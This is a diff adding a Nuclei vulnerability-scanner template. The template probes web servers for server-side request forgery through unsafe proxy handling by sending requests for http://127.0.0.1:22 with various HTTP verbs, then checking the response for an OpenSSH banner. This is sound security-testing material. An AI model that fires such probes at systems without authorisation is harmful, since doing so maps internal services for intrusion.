@@ -1,0 +1,47 @@
+id: ssrf-via-proxy
+
+info:
+  name: SSRF via Proxy Unsafe
+  author: geeknik,petergrifin
+  severity: unknown
+  reference:
+    - https://github.com/geeknik/the-nuclei-templates/blob/main/ssrf-by-proxy.yaml
+    - https://twitter.com/HusseiN98D/status/1649006265450782720
+    - https://twitter.com/ImoJOnDz/status/1649089777629827072
+  metadata:
+    max-request: 9
+  tags: fuzzing,ssrf,proxy,oast,fuzz
+
+http:
+  - payloads:
+      verb:
+        - GET
+        - HEAD
+        - POST
+        - PUT
+        - DELETE
+        - CONNECT
+        - OPTIONS
+        - TRACE
+        - PATCH
+    raw:
+      - |+
+        {{verb}} http://127.0.0.1:22 HTTP/1.1
+        Host: {{Hostname}}
+
+    stop-at-first-match: true
+    unsafe: true
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "Protocol mismatch"
+          - "OpenSSH"
+        condition: and
+
+      - type: status
+        status:
+          - 200
+# digest: 4b0a00483046022100edb83f65da973658c5c52b6edf436c3fe86c3915a45c05a90e002e539ac8c831022100a92c9e63042f21080a48bab10f578e896794c2bf4d112c47e32573fcc67b5242:922c64590222798bb761d5b6d8e72950
